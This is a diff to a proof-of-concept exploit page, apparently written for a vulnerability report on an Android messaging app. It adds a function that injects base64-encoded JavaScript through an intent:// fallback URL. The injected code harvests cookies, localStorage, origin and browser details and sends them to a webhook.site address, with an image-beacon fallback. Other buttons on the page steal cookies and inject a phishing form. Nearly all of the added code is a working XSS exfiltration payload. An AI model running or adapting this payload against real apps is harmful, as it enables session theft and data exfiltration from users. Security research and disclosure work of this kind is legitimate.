@@ -50,7 +50,8 @@ input[type=text] { background: #000; color: #0f0; border: 1px solid #0f0; paddin
 
   <button onclick="xssProof()">1a. XSS Proof (change title)</button>
   <button class="btn-fire" onclick="xssStealAll()">1b. STEAL cookies + storage + DOM</button>
-  <button class="btn-fire" onclick="xssPhish()">1c. Inject phishing form</button>
+  <button class="btn-fire" onclick="xssExfilWebhook()">1c. EXFIL to webhook.site (OOB)</button>
+  <button class="btn-fire" onclick="xssPhish()">1d. Inject phishing form</button>
 </div>
 
 <!-- ============================================================ -->
@@ -215,6 +216,56 @@ function xssStealAll() {
 
     var payload = "javascript:eval(atob('" + btoa(code) + "'))";
     L('critical', 'Injecting JS to steal all client-side data...');
+    setTimeout(function() { window.location.href = intentUri(payload); }, 300);
+}
+
+function xssExfilWebhook() {
+    L('info', '=== EXPLOIT 1c: Out-of-Band Exfil to webhook.site ===');
+    L('critical', 'Stolen data will appear at: https://webhook.site/9556e669-143e-4418-97c8-561b1633b6d1');
+
+    // Seed realistic test data
+    try {
+        document.cookie = 'auth_token=SECRET_eyJhbGciOiJIUzI1NiJ9.test_poc';
+        document.cookie = 'session_id=SESS_' + Date.now();
+        localStorage.setItem('arattai_enc_key', 'AES256_FAKE_KEY_FOR_POC');
+        localStorage.setItem('user_profile', '{"id":"60034506896","phone":"+91XXXXXXXXXX"}');
+        L('info', 'Seeded test auth data');
+    } catch(e) {}
+
+    // JS payload that collects data and POSTs to webhook.site
+    // Avoids semicolons since they delimit intent:// extras
+    var code = [
+        'var c=document.cookie',
+        'var ls={}',
+        'for(var i=0,n=localStorage.length',
+        'i<n',
+        'i++){var k=localStorage.key(i)',
+        'ls[k]=localStorage.getItem(k)}',
+        'var payload=JSON.stringify({',
+        'vuln:"ART-02 javascript: XSS via browser_fallback_url",',
+        'file:"MiniAppDialogFragment.kt:2165",',
+        'cookies:c,',
+        'localStorage:ls,',
+        'origin:location.origin,',
+        'href:location.href,',
+        'userAgent:navigator.userAgent,',
+        'platform:navigator.platform,',
+        'timestamp:new Date().toISOString()},null,2)',
+        'fetch("https://webhook.site/9556e669-143e-4418-97c8-561b1633b6d1",{',
+        'method:"POST",',
+        'headers:{"Content-Type":"application/json"},',
+        'body:payload',
+        '}).then(function(r){',
+        'window.__exfilCallback("WEBHOOK_STATUS","Sent! HTTP "+r.status)',
+        '}).catch(function(e){',
+        'new Image().src="https://webhook.site/9556e669-143e-4418-97c8-561b1633b6d1?d="+encodeURIComponent(payload.substring(0,1800))',
+        'window.__exfilCallback("WEBHOOK_FALLBACK","Sent via IMG beacon: "+e.message)',
+        '})',
+        'window.__exfilCallback("EXFIL_PAYLOAD",payload)'
+    ].join(';\n');
+
+    var payload = "javascript:eval(atob('" + btoa(code) + "'))";
+    L('critical', 'Injecting JS to exfiltrate data out-of-band...');
     setTimeout(function() { window.location.href = intentUri(payload); }, 300);
 }
 
